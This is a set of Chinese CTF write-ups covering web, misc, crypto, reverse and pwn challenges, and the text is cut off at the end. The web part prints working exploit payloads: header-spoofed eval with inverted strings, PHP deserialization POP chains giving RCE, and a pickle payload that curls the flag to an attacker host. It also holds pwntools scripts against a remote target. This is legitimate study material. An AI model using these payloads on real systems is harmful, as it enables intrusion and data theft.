85%9B%B7%B5%CD%A6%A8%88%90%B5%B7%A5%97%9D%B7%A9%93%B4%AC%CA%AE%AC%B9%BD%99%AD%AA%C6%B2%B4%AB%8C%B1%BC%96%AD%8F%AF%AB%BE%C8%BB%AE%8F%CC%9E%B8%93%8C%A5%AC%BE%90%B5%B8%94%C7%B2%95%BE%88%B4%A7%8C%B1%BC%96%BE%98%B6%BC%BE%94%9C%92%A9%97%A5%BB%CE%92%9C%92%A9%97%A5%BC%98%94%9C%92%98%8C%B2%95%BE%CF%B0%BC%94%C8%BB%AE%90%98%B6%BC%BE%98%A5%A8%B1%90%9D%86%BE%96%B5%B8%94%C9%B5%B7%B5%93%A6%A8%AD%9C%9D%96%B6%C8%BB%AE%90%98%B6%BC%BE%98%B5%B8%C6%88%AF%AC%B5%9C%B5%B7%A5%97%9D%B7%A9%93%AF%AC%B6%8A%9B%B7%B5%8F%9D%AC%97%85%9B%B7%B5%CF%9D%CD%8C%90%B5%B7%B5%93%A6%A8%AE%8C%B6%96%BE%C6%B6%96%94%8F%B3%96%9C%C8%B5%85%8C%B1%BC%96%BE%98%B6%BC%BE%98%B6%BC%BE%B1%BC%96%BE%98%B6%BC%BD%93%9B%92%B9%8C%B4%BC%AD%89%9C%BC%94%C8%BB%AE%90%98%B6%BC%BE%98%A5%91%9B%86%9E%A7%AD%93%B4%BC%AD%CC%9E%BC%87%85%9B%B7%B5%CD%A6%A8%88%90%B5%B7%A5%97%9D%B7%A9%93%B4%AC%CA%AE%AC%B9%BD%99%AD%AA%C6%B2%B4%AB%8C%B1%BC%98%94%94%9E%AC%8C%8D%B0%88%CF%B4%99%AE%CF%B4%DD%DF%83%DF%9D%9E%8C%9A%C9%CB%DF%D2%9B%DF%C1%DF%D0%8B%92%8F%D0%9E%D1%8F%97%8F%D6%DF%D9%D9%DF%8F%97%8F%DF%D0%8B%92%8F%D0%9E%D1%8F%97%8F);


决赛[baby md5]check.php
&lt;?phperror_reporting(0);function isRequestFromLocal() &#123;    // 定义本地IP地址    $localIP = &#x27;127.0.0.1&#x27;;    // 获取客户端IP地址    $clientIP = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];    // 比较客户端IP地址与本地IP地址    if ($clientIP === $localIP) &#123;        // 请求来自本地        return true;    &#125; else &#123;        // 请求不来自本地        return false;    &#125;&#125;?&gt;

index.php
&lt;?phperror_reporting(0);require_once &#x27;check.php&#x27;;if (isRequestFromLocal()) &#123;    echo &#x27;hello!&#x27;;    $a = $_GET[&#x27;cmd&#x27;];    $b = $_GET[&#x27;key1&#x27;];    $c = $_GET[&#x27;key2&#x27;];    if(!preg_match(&quot;/eval|shell_exec|system|proc_open|popen|pcntl_exec|\&#x27;|cat|include|whoami/i&quot;,$a))&#123;        if(md5($b) == md5($c))&#123;            eval($a);        &#125;    &#125;else&#123;        echo &#x27;Oh no, you are hacker!!!&#x27;;    &#125;&#125; else &#123;    die(&quot;failed&quot;);&#125;?&gt;

ip验证用X-Forwarded-For，md5弱比较用数组绕过，正则匹配用取反绕过
payload：X-Forwarded-For=127.0.0.1,cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);&amp;key1[]=1&amp;key2[]=2

决赛[easy serialize]&lt;?php//flag is in /flag.phperror_reporting(0);class baby&#123;    public $var;    public $var2;    public $var3;    public function learn($key)&#123;        echo file_get_contents(__DIR__.$key);    &#125;    public function getAge()&#123;        return $this-&gt;var2-&gt;var3;    &#125;    public function __isset($var)&#123;        $this-&gt;learn($var);    &#125;    public function __invoke()&#123;        return $this-&gt;learn($this-&gt;var);    &#125;    public function __wakeup()&#123;        $this-&gt;getAge();    &#125;&#125;class young&#123;    public $var;    public function __toString()&#123;        return ($this-&gt;var)();    &#125;&#125;class old&#123;    public $var;    public function __get($key)&#123;        return &quot;Okay, you get the key, but we send you &quot;.$this-&gt;var;    &#125;&#125;if(isset($_GET[&#x27;age&#x27;]))&#123;    @unserialize($_GET[&#x27;age&#x27;]);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;

给定了flag位置，同时又有file_get_contents,那么就从learn函数入手。很明显__invoke调用了learn，传进去了可控的$var，而在yong::__tostring中可以触发baby::__invoke，old::__get中可以触发yong::__tostring，baby中的getAge又能触发old::__get
payload
&lt;?phpclass baby&#123;    public $var=&#x27;/flag.php&#x27;;    public $var2;    public $var3;    public function learn($key)&#123;        echo file_get_contents(__DIR__.$key);    &#125;    public function getAge()&#123;        return $this-&gt;var2-&gt;var3;    &#125;    public function __invoke()&#123;        return $this-&gt;learn($this-&gt;var);    &#125;    public function __wakeup()&#123;        $this-&gt;getAge();    &#125;&#125;class young&#123;    public $var;    public function __toString()&#123;        return ($this-&gt;var)();    &#125;&#125;class old&#123;    public $var;    public function __get($key)&#123;        return &quot;Okay, you get the key, but we send you &quot;.$this-&gt;var;    &#125;&#125;$a = new baby();$a-&gt;var2 = new old();$a-&gt;var2-&gt;var = new young();$a-&gt;var2-&gt;var-&gt;var = new baby();echo urlencode(serialize($a));


决赛[p2rce]&lt;?phperror_reporting(0);class CCC &#123;    public $c;    public $a;    public $b;    public function __destruct()    &#123;        $this-&gt;a = &#x27;flag&#x27;;        if($this-&gt;a === $this-&gt;b) &#123;            echo $this-&gt;c;        &#125;    &#125;&#125;class AAA &#123;    public $s;    public $a;    public function __toString()    &#123;        $p = $this-&gt;a;        return $this-&gt;s-&gt;$p;    &#125;&#125;class BBB &#123;    private $b;    public function __get($name)    &#123;        if (is_string($this-&gt;b) &amp;&amp; !preg_match(&quot;/[A-Za-z0-9_$]+/&quot;, $this-&gt;b)) &#123;            global $flag;            $flag = $this-&gt;b;            return &#x27;ok&#x27;;        &#125; else &#123;            return &#x27;&lt;br/&gt;get it!!&#x27;;        &#125;    &#125;&#125;if(isset($_GET[&#x27;ctf&#x27;])) &#123;    if(preg_match(&#x27;/flag/i&#x27;, $_GET[&#x27;ctf&#x27;])) &#123;       die(&#x27;nonono&#x27;);    &#125;    $a = unserialize($_GET[&#x27;ctf&#x27;]);    system($flag);    throw new Exception(&quot;goaway!!!&quot;);&#125; else &#123;    highlight_file(__FILE__);&#125;

从CCC::__destruct进入，有个判断，用&amp;引用地址，使$a永远与$b相等，然后echo触发AAA::__toString，接着可以通过return对象中不存在的属性来触发BBB::__get，最后绕过正则实现rce
最后结尾还有一个throw new Exception，破坏字符串结构即可触发fast destruct
&lt;?phpclass CCC &#123;    public $c;    public $a;    public $b;    public function __construct()    &#123;        $this-&gt;b = &amp;$this-&gt;a;    &#125;    public function __destruct()    &#123;        $this-&gt;a = &#x27;flag&#x27;;        if($this-&gt;a === $this-&gt;b) &#123;            echo $this-&gt;c;        &#125;    &#125;&#125;class AAA &#123;    public $s;    public $a=&#x27;lewiserii&#x27;;    public function __toString()    &#123;        $p = $this-&gt;a;        return $this-&gt;s-&gt;$p;    &#125;&#125;class BBB &#123;    public $b=&#x27;/???/?? /* .&#x27;;    public function __get($name)    &#123;        if (is_string($this-&gt;b) &amp;&amp; !preg_match(&quot;/[A-Za-z0-9_$]+/&quot;, $this-&gt;b)) &#123;            global $flag;            $flag = $this-&gt;b;            return &#x27;ok&#x27;;        &#125; else &#123;            return &#x27;&lt;br/&gt;get it!!&#x27;;        &#125;    &#125;&#125;$a = new CCC();$a-&gt;c = new AAA();$a-&gt;c-&gt;s = new BBB();echo urlencode(serialize($a));

O%3A3%3A%22CCC%22%3A3%3A%7Bs%3A1%3A%22c%22%3BO%3A3%3A%22AAA%22%3A2%3A%7Bs%3A1%3A%22s%22%3BO%3A3%3A%22BBB%22%3A1%3A%7Bs%3A1%3A%22b%22%3Bs%3A12%3A%22%2F%3F%3F%3F%2F%3F%3F+%2F%2A+.%22%3B%7Ds%3A1%3A%22a%22%3Bs%3A9%3A%22lewiserii%22%3B%7Ds%3A1%3A%22a%22%3BN%3Bs%3A1%3A%22b%22%3BR%3A6%3B
通过通配符匹配&#x2F;bin&#x2F;cp，将根目录所有文件复制到根目录，然后访问获得flag
或者通过. /???/????????[@-[]匹配php的临时文件来rce
POST /?ctf=O%3A3%3A%22CCC%22%3A3%3A%7Bs%3A1%3A%22c%22%3BO%3A3%3A%22AAA%22%3A2%3A%7Bs%3A1%3A%22s%22%3BO%3A3%3A%22BBB%22%3A1%3A%7Bs%3A1%3A%22b%22%3Bs%3A20%3A%22.+%2F%3F%3F%3F%2F%3F%3F%3F%3F%3F%3F%3F%3F%5B%40-%5B%5D%22%3B%7Ds%3A1%3A%22a%22%3Bs%3A9%3A%22lewiserii%22%3B%7Ds%3A1%3A%22a%22%3BN%3Bs%3A1%3A%22b%22%3BR%3A6%3B% HTTP/1.1Host: 192.168.100.100:10033Content-Length: 186Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: nullContent-Type: multipart/form-data; boundary=----WebKitFormBoundary0xXn6nlxZVqh49pSUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: close------WebKitFormBoundary0xXn6nlxZVqh49pSContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;Content-Type: text/plaincat /f*------WebKitFormBoundary0xXn6nlxZVqh49pS--


决赛[babyWeb]pickle反序列化
import pickleimport base64class GetShellWithPython(object):   def __reduce__(self):       import subprocess       return (subprocess.call,              ([&#x27;python&#x27;,                 &#x27;-c&#x27;,                 &#x27;import os;&#x27;                 &#x27;os.system(&quot;curl http://x.x.x.x:4444?a=`cat /flag`&quot;);&#x27;],))pickleData = pickle.dumps(GetShellWithPython())print(base64.b64encode(pickleData))


misc初赛[number game]查看index.js
function roll() &#123;    var _0x38f496 = _0x359f      , _0x1afb7a = Math[_0x38f496(0xda)](Math[_0x38f496(0xd5)]() * 0x3e8);    document[&#x27;getElementById&#x27;](&#x27;number&#x27;)[_0x38f496(0xdc)] = _0x1afb7a[_0x38f496(0xd3)]();    if (_0x1afb7a == 0x539) &#123;        var _0x14184c = [0x38, 0x6f, 0x1e, 0x24, 0x1, 0x32, 0x51, 0x45, 0x1, 0x3c, 0x24, 0xb, 0x55, 0x38, 0xa, 0x5d, 0x28, 0x12, 0x33, 0xb, 0x5d, 0x20, 0x1e, 0x46, 0x17, 0x3d, 0x10, 0x2a, 0x41, 0x44, 0x49, 0x1a, 0x31, 0x5a]          , _0x477866 = &#x27;&#x27;;        for (var _0x6698b7 = 0x0; _0x6698b7 &lt; _0x14184c[&#x27;length&#x27;]; _0x6698b7++)            _0x477866 += String[_0x38f496(0xd9)](_0x14184c[_0x6698b7] ^ _0x6698b7 + 0x5a);        alert(_0x477866);    &#125;&#125;


a=[0x38,0x6f,0x1e,0x24,0x1,0x32,0x51,0x45,0x1,0x3c,0x24,0xb,0x55,0x38,0xa,0x5d,0x28,0x12,0x33,0xb,0x5d,0x20,0x1e,0x46,0x17,0x3d,0x10,0x2a,0x41,0x44,0x49,0x1a,0x31,0x5a]for i,v in enumerate(a):    a[i]=v^i+0x5aprint(bytes(a))

初赛[Ez_misc]文件高位和低位交换位置
f=open(&#x27;1.jpg&#x27;,&#x27;rb&#x27;)f1=open(&#x27;2.jpg&#x27;,&#x27;wb&#x27;)d=f.read()for i in d:    n=(i//16)+((i&amp;0xf)&lt;&lt;4)    f1.write(bytes([n]))

steghide空密码解密得到flag.txt

将DASH替换成-，DOT替换成.后解摩斯

初赛[Steins_Gate]给了一张很大的图片，由嘟嘟噜组成一张图片，观察发现每个字是16*16
猜测是把原图像素替换成文字了
在每个字中找一个固定的像素点，然后提取像素还原原图
from PIL import Imageimg = Image.open(&#x27;Steins_Gate.png&#x27;)width,height=img.sizenew_img = Image.new(&quot;RGB&quot;, (int(width / 16), int(height / 16)))for i in range(5,height,16):    for j in range(2,width,16):        tmp = img.getpixel((j,i))        print(tmp)        new_img.putpixel((int(j / 16), int(i / 16)), (tmp[0], tmp[1], tmp[2]))new_img.show()new_img.save(&#x27;out.png&#x27;)


使用stegsolve发现0通道有很多base64

提取出来后发现每组后还有12个字节的冗余数据
with open(&#x27;out&#x27;,&#x27;rb&#x27;)as f:    with open(&#x27;1.txt&#x27;,&#x27;wb&#x27;) as f1:        data=f.read()        i=0        while i&lt;len(data):            f1.write(data[i:i+240]+b&quot;\n&quot;)            i+=252

去除冗余数据后base64解出一张图片

同时也是多行base64的形式，尝试base64隐写
# -*- coding: utf-8 -*-#base64解码脚本，Python2 运行b64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;with open(&#x27;1.txt&#x27;, &#x27;rb&#x27;) as f:    bin_str = &#x27;&#x27;    for line in f.readlines():        stegb64 = &#x27;&#x27;.join(line.split())        rowb64 =  &#x27;&#x27;.join(stegb64.decode(&#x27;base64&#x27;).encode(&#x27;base64&#x27;).split())        offset = abs(b64chars.index(stegb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1])-b64chars.index(rowb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1]))        equalnum = stegb64.count(&#x27;=&#x27;)        if equalnum:            bin_str += bin(offset)[2:].zfill(equalnum * 2)        print &#x27;&#x27;.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)])

得到密码DuDuLu~T0_Ch3@t_THe_w0r1d
outguess解密得到flag

决赛[Xcode v5.8]xxencode-&gt;base58

决赛[Ez_Signin]zip爆破密码，得到11452
base32解密后得到一个文本
MoveTo 495, 314KeyUp &quot;CapsLock&quot;, 1LeftClick 1LeftDown 1MoveTo 495, 313MoveTo 495, 312MoveTo 494, 312MoveTo 494, 311MoveTo 493, 311Delay 1...省略...MouseWheel 1Delay 1MouseWheel 1MouseWheel 1MouseWheel 1MouseWheel 1MouseWheel 1KeyDown &quot;CapsLock&quot;, 1

根据文本内容进行画图
from PIL import Imagea=Image.new(&quot;1&quot;,(2000,2000))f=open(&quot;flag.txt&quot;)d=f.read().splitlines()for i in d:    if &#x27;MoveTo&#x27; not in i:        continue    i=i[6:].split(&#x27;,&#x27;)    x=int(i[0])    y=int(i[1])    a.putpixel((x,y),255)a.save(&quot;1.png&quot;)


crypto初赛[小小数学家]计算式子
a=[]a.append(19+49)a.append(96-31)a.append(86-3)a.append(20+47)a.append(29+55)a.append(35+35)a.append(81+42)a.append(73-16)a.append(52+48)a.append(0+56)a.append(55-6)a.append(69-20)a.append(99-48)a.append(100-52)a.append(36+13)a.append(32+13)a.append(84-34)a.append(90-34)a.append(94-45)a.append(85+13)a.append(50-5)a.append(55-3)a.append(77+25)a.append(87-35)a.append(62+35)a.append(88-43)a.append(86-30)a.append(90+10)a.append(66-17)a.append(34+63)a.append(51-6)a.append(22+76)a.append(46+5)a.append(45+11)a.append(20+78)a.append(56+45)a.append(99//1)a.append(47+52)a.append(58+44)a.append(76-26)a.append(92-42)a.append(12+44)a.append(80-27)a.append(5*25)print(bytes(a))




初赛[An EaSy Cipher][&quot;Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08。RUNCIDAgMTI4IHNpeCBudW1iZXJz&quot;,&quot;Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08&quot;]

提示：ECB 0 128 six numbers
写脚本爆破
c=&quot;Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08&quot;key=&quot;RUNCIDAgMTI4IHNpeCBudW1iZXJz&quot;#mcrypt是自定义的模块，包含aesfrom mcrypt.boom import *from mcrypt.base import *from mcrypt.aes import *base=&quot;0123456789&quot;f=open(&quot;data.txt&quot;,&#x27;wb&#x27;)for i in Gendic(base,6,True):    a=aes(&#x27;&#x27;.join(i),Pad_type=1)    data=a.decrypt(b64().decode(c))    try:        print(data.decode(&quot;utf-8&quot;),i)        f.write(data)        f.write(b&#x27;\n&#x27;)        f.flush()    except:        pass


reverse初赛[pyccc]使用pycdc反编译
# Source Generated with Decompyle++# File: baby.pyc (Python 3.8)a = input(&#x27;please input your flag:\n&#x27;)check = [    102,    109,    99,    100,    127,    52,    114,    88,    97,    122,    85,    125,    105,    127,    119,    80,    120,    112,    98,    39,    109,    52,    55,    106]if len(a) == 24:    for i in range(len(a)):        if check[i] == ord(a[i]) ^ i:            continue            print(yes)        print(&#x27;nononono&#x27;)    continueelse:    print(&#x27;nononono&#x27;)

check = [    102,    109,    99,    100,    127,    52,    114,    88,    97,    122,    85,    125,    105,    127,    119,    80,    120,    112,    98,    39,    109,    52,    55,    106]for i in range(len(check)):    print(chr(check[i] ^ i), end=&quot;&quot;)


初赛[easyapk]密文是HPjVMiy4FxSPc1n0eq52t4jaZ7FNr/qvJMjkusqbG6t8IVzztqflA0VQmVZYgiaC，iv是0123456789ABCDEF

密钥中e替换成3
final String replaceAll = &quot;reversecarefully&quot;.replaceAll(&quot;e&quot;, &quot;3&quot;);
加密模式是AES


初赛[luare]先导出lua的字节码

修补文件头为1B 4C 7561 52，其中52是版本号

使用unluac反编译
java -jar unluac.jar out &gt; out.lua
得到
function CheckAns(data)  if #data ~= 40 then    return false  end  dataOut = Oo00Oo0(data)  enc = &#123;    109,    -73,    -72,    46,    -73,    -5,    99,    -100,    46,    59,    32,    -76,    109,    3,    59,    20,    -61,    -56,    -119,    48,    100,    118,    36,    118,    82,    3,    95,    106,    14,    -80,    5,    -89,    89,    -85,    5,    14,    46,    -73,    7,    127  &#125;  i = 1  while i &lt;= #dataOut do    if dataOut[i] ~= enc[i] then      return false    end    i = i + 1  end  return trueendprint(&quot;input: &quot;)local data = io.read()if CheckAns(data) then  print(&quot;true&quot;)else  print(&quot;false&quot;)end

分析Oo00Oo0函数，简单异或

解密脚本
v7=[0]*32v7= [0x60856D1028C8953C,0x964849764CB30359,0x2E7164C479B75FB8,0x80637291A7AC8C38,0x7B8BF3AE4B339EB0,\    0xCFE06FEC52B45B4D,0x5DC67EAAB20C3AD,0x24FCFBD656409F00,0x4AF00D463D0BCA92,0x7DBC8A3B1A11555A,0x3061CE7513A9E76C,\    0x9C54D007276AA614,0x34C20158D8898E5C,0x50A02AC02F3569E8,0xC0E681D39FF8836,0xB66E7F18FEB1E693,\    0x29F5D2E92B315378,0x41D9DBDE84172C0F,0x7A45A899A1F71906,0xE5AA0AAF1BA5233E,0x9A3A82FAF8E1A4EF,\    0xC1D173C7651C8FDF,0x8D9DDD875EA2D7C5,0x66EE9790CD81C9F9,0x370874C63F424FDA,0xB93283E32677CB25,\    0xBA2D4ED544F2D3BD,0xBFE421121E049862,0xA31694FDF486F647,0x430251B27C701FEB,0x5DE26B097ECC1522,0xF157EDD4B5BE9BBB]table=b&quot;&quot;for i in v7:  table+=i.to_bytes(8,&#x27;little&#x27;)table=list(table)enc=[109,-73,-72,46,-73,-5,99,-100,46,59,32,-76,109,3,59,20,-61,-56,\     -119,48,100,118,36,118,82,3,95,106,14,-80,5,-89,89,-85,5,14,46,-73,7,127]for i,v in enumerate(enc):  enc[i]=v&amp;0xffflag=[]flag.insert(0,table.index(enc[-1]))ind=len(enc)-2while ind&gt;=0:  flag.insert(0,table.index(enc[ind])^flag[0])  ind-=1print(bytes(flag))


决赛[Ez8or]加密数据再次异或后得到flag
from pwn import *import timea=[  168, 172,  54, 106, 196,  10, 154, 220,  18,  72,  242,  96, 203, 204,  58,  94, 242,  99, 156, 148,  245,  72, 205,  23, 130, 205, 247, 113, 159,  54,  180, 136, 175,  95, 221, 100, 133, 150, 247,  94,  196,   9, 173, 221, 171,  22, 153,  96, 155, 222,  245,  83, 195,  33, 252, 128, 248,  16, 199,  38]p=process(&quot;./Ez8or&quot;)p.readuntil(&#x27;flag&#x27;)gdb.attach(p,&#x27;bp $rebase(0x1476)&#x27;)# 修改加密函数的参数为密文地址，函数结束后，查看密文地址处储存的信息pause()p.sendline(bytes(a))p.interactive()


pwn决赛[SafeNote]伪随机数，先获取密文
from pwn import *from ctypes import CDLLlib=CDLL(&quot;./libc.so.6&quot;)p=process(&quot;SafeNote&quot;)i=96while i&gt;0:    p=remote(&quot;10.1.101.234&quot;,9999)    t=lib.time(0)    p1=process(&quot;./a.out&quot;)    p1.sendline(str(i))    p.readuntil(&quot;N =&quot;)    d2=int(p.readline())    p.sendlineafter(&quot;choice:&quot;,&#x27;3&#x27;)    p.readuntil(&quot;password = &quot;)    d=int(p.readline().strip().decode(&quot;utf-8&quot;))    p1.send(str(d))    p1.readuntil(&#x27;n:&#x27;)    d1=int(p1.readline().decode(&quot;utf-8&quot;).strip())    print(&quot;n(1): &quot;+str(d2))    print(&quot;n(2): &quot;+str(d1))    print(&quot;nu: &quot;+str(i))    print(&quot;time: &quot;+str(t))    if d2!=d1:        p.close()        p1.close()        i-=1        continue    breakp1.readuntil(&#x27;data:&#x27;)d=p1.readline()print(d)p.interactive()

rsa解密得到password，然后将password发送给靶机得到flag
#include&lt;gmp.h&gt;#include&lt;time.h&gt;#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;gmp_randstate_t gmp_state;__mpz_struct p,q,n_,e,p_1,q_1,lambda,d_;__mpz_struct secret,msg;char* data,data1;int main()&#123;	data=malloc(0x2000);	data1=malloc(0x2000);	__gmpz_inits(&amp;p,&amp;q,&amp;n_,&amp;e,&amp;p_1,&amp;q_1,&amp;lambda,&amp;d_,&amp;secret,&amp;msg,0);	__gmp_randinit_mt(&amp;gmp_state);	long long int num=0;	scanf(&quot;%lld&quot;,&amp;num);	__gmp_randseed_ui(&amp;gmp_state,time(0)+num);	__gmpz_urandomb(&amp;q,&amp;gmp_state,256);	__gmpz_nextprime(&amp;q,&amp;q);	__gmpz_urandomb(&amp;p,&amp;gmp_state,256);	__gmpz_nextprime(&amp;p,&amp;p);	 __gmpz_mul(&amp;n_, &amp;p, &amp;q);	  __gmpz_set_ui(&amp;e, 65537LL);	  __gmpz_sub_ui(&amp;p_1, &amp;p, 1LL);	  __gmpz_sub_ui(&amp;q_1, &amp;q, 1LL);	  __gmpz_lcm(&amp;lambda, &amp;p_1, &amp;q_1);	  __gmpz_invert(&amp;d_, &amp;e, &amp;lambda);	printf(&quot;n: %s\n&quot;,__gmpz_get_str(0,0,&amp;n_));	read(0,data,0x100);	__gmpz_set_str(&amp;secret,data,10);	__gmpz_powm(&amp;msg,&amp;secret,&amp;d_,&amp;n_);	printf(&quot;data: %s\n&quot;,__gmpz_get_str(0,0,&amp;msg));&#125;]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2023竞赛</tag>
        <tag>浙江</tag>
      </tags>
  </entry>
  <entry>
    <title>第八届西湖论剑中国杭州网络安全安全技能大赛初赛 部分wp</title>
    <url>/posts/74a23a1b/</url>
    <content><![CDATA[dseasydatalog分析error.log发现首先上传了木马，然后用蚁剑进行连接
全局搜索发现包含一个zip和jpg

压缩包数据很少直接手动提取出来，图片数据太多用脚本提取出来
import redef extract_jpg_data(log_file):    # 读取日志文件内容    with open(log_file, &#x27;r&#x27;) as f:        content = f.read()    lines = content.split(&#x27;\n&#x27;)    hex_data = []    for line in lines:        # 跳过包含readbytes或bytes的行        if &#x27;readbytes&#x27; in line or &#x27;bytes&#x27; in line:            continue        # 如果行包含dumpio_in或dumpio_out        if &#x27;dumpio_in&#x27; in line or &#x27;dumpio_out&#x27; in line:            # 提取冒号后的内容            parts = line.split(&#x27;dumpio_in (data-HEAP): &#x27;, maxsplit=1)            if len(parts) &gt; 1:                data = parts[1].strip()            else:                parts = line.split(&#x27;dumpio_out (data-HEAP): &#x27;, maxsplit=1)                if len(parts) &gt; 1:                    data = parts[1].strip()                else:                    continue            hex_data.append(data)    data = &#x27;&#x27;.join(hex_data)    # 查找jpg数据（从FFD8到FFD9）    jpg_pattern = r&#x27;FFD8FFE0.*?00FFD9&#x27;    jpg_matches = re.findall(jpg_pattern, data)    # 保存找到的jpg数据    for i, jpg_data in enumerate(jpg_matches):        binary_data = bytes.fromhex(jpg_data)        with open(f&#x27;out.jpg&#x27;, &#x27;wb&#x27;) as f:            f.write(binary_data)if __name__ == &#x27;__main__&#x27;:    extract_jpg_data(&#x27;error.log&#x27;)

图片盲水印得到密码

用得到的密码dataPersonPass123987解压压缩包得到用户信息表
拼接出张三的身份证号和手机号
30601319731003117X_79159498824
DSASignatureDatatshark筛选出所有的数据
tshark -r data.pcapng -T fields -e http.file_data  -e http.request.uri &gt; data.txt
对筛选出来的数据进行整理，转成明文后去重和排序
import json# 将十六进制字符串转换为字节，然后解码为UTF-8字符串def decode_hex_string(hex_string):    return bytes.fromhex(hex_string).decode(&#x27;utf-8&#x27;)def process_data():    with open(&#x27;data.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:        lines = f.readlines()    result = []    seen = set()  # 用于记录已经处理过的数据    for line in lines:        if &#x27;/?userid=&#x27; in line:            json_hex = line.strip().split(&#x27;\t&#x27;)[0]  # 提取JSON数据部分            try:                json_str = decode_hex_string(json_hex)                data = json.loads(json_str)                userid = line.split(&#x27;/?userid=&#x27;)[1].split()[0]                data[&#x27;userid&#x27;] = userid                unique_key = (data[&#x27;idcard&#x27;], data[&#x27;phone&#x27;])                if unique_key not in seen:                    seen.add(unique_key)                    result.append(data)            except:                continue    print(f&quot;Found &#123;len(result)&#125; unique records&quot;)    result.sort(key=lambda x: int(x[&#x27;userid&#x27;]))    with open(&#x27;data_new.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as f:        for data in result:            line = f&quot;&#123;data[&#x27;userid&#x27;]&#125;,&#123;data[&#x27;name&#x27;]&#125;,&#123;data[&#x27;idcard&#x27;]&#125;,&#123;data[&#x27;phone&#x27;]&#125;\n&quot;            f.write(line)if __name__ == &#x27;__main__&#x27;:    process_data()

得到全部的数据
userid,name,idcard,phone1,侯俊英,532215199108067664,734576470682,寇雪,637373199908267850,793114644333,南郭映安,516067201404039268,798431615204,仲长宗,690694198504259989,789272586875,伏羲永琴,968155199102184917,787810340186,班涵润,496980198102184431,730568591847,丁映安,098529200809222274,793985052118,通春雪,838747198907275515,74568181144...1996,东关燕子,864371198811109088,755891423371997,桂秀慧,921145197101023429,734570339281998,车钗,284617199806039673,749608999031999,文浩渺,829973198603161976,738712357892000,祁陈红,987193201007052887,74518763400


然后与data-sign.csv中的签名数据比较
import csvfrom cryptography.hazmat.primitives import hashesfrom cryptography.hazmat.primitives.asymmetric import dsa, utilsfrom cryptography.hazmat.primitives.serialization import load_pem_public_keyfrom cryptography.exceptions import InvalidSignatureimport base64def load_public_key(userid):    &quot;&quot;&quot;加载用户的公钥&quot;&quot;&quot;    userid_padded = str(userid).zfill(4)    with open(f&#x27;public/public-&#123;userid_padded&#125;.pem&#x27;, &#x27;rb&#x27;) as f:        key_data = f.read()        return load_pem_public_key(key_data)def verify_signature(public_key, message, signature):    &quot;&quot;&quot;验证签名&quot;&quot;&quot;    try:        # 解码Base64签名        signature_bytes = base64.b64decode(signature)        # 提取r和s值        r = int.from_bytes(signature_bytes[:20], &#x27;big&#x27;)        s = int.from_bytes(signature_bytes[20:], &#x27;big&#x27;)        # 计算消息哈希并编码签名        message_bytes = message.encode(&#x27;utf-8&#x27;)        encoded_signature = utils.encode_dss_signature(r, s)        # 验证签名        public_key.verify(            encoded_signature,            message_bytes,            hashes.SHA256()        )        return True    except (InvalidSignature, Exception):        return Falsedef verify_records():    &quot;&quot;&quot;验证所有记录&quot;&quot;&quot;    # 读取原始数据    original_data = &#123;&#125;    with open(&#x27;data_new.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:        next(f)  # 跳过标题行        for line in f:            userid, name, idcard, phone = line.strip().split(&#x27;,&#x27;)            original_data[userid] = &#123;                &#x27;name&#x27;: name,                &#x27;idcard&#x27;: idcard,                &#x27;phone&#x27;: phone            &#125;    # 读取签名数据    signatures = &#123;&#125;    with open(&#x27;data-sign.csv&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:        reader = csv.DictReader(f)        for row in reader:            userid = row[&#x27;username&#x27;]            signatures[userid] = &#123;                &#x27;name_signature&#x27;: row[&#x27;name_signature&#x27;],                &#x27;idcard_signature&#x27;: row[&#x27;idcard_signature&#x27;],                &#x27;phone_signature&#x27;: row[&#x27;phone_signature&#x27;]            &#125;    # 验证每条记录    tampered_records = []    for userid, orig_data in original_data.items():        # 加载公钥        try:            public_key = load_public_key(userid)            sig_data = signatures[userid]            # 验证所有字段的签名            name_valid = verify_signature(public_key, orig_data[&#x27;name&#x27;], sig_data[&#x27;name_signature&#x27;])            idcard_valid = verify_signature(public_key, orig_data[&#x27;idcard&#x27;], sig_data[&#x27;idcard_signature&#x27;])            phone_valid = verify_signature(public_key, orig_data[&#x27;phone&#x27;], sig_data[&#x27;phone_signature&#x27;])            # 如果任何字段验证失败，记录该条数据            if not (name_valid and idcard_valid and phone_valid):                tampered_records.append(&#123;                    &#x27;userid&#x27;: userid,                    &#x27;name&#x27;: orig_data[&#x27;name&#x27;],                    &#x27;idcard&#x27;: orig_data[&#x27;idcard&#x27;],                    &#x27;phone&#x27;: orig_data[&#x27;phone&#x27;]                &#125;)        except Exception:            continue    return tampered_recordsdef main():    # 验证记录并获取被篡改的数据    tampered_records = verify_records()    # 将被篡改的记录写入CSV文件    if tampered_records:        with open(&#x27;tampered_records.csv&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;, newline=&#x27;&#x27;) as 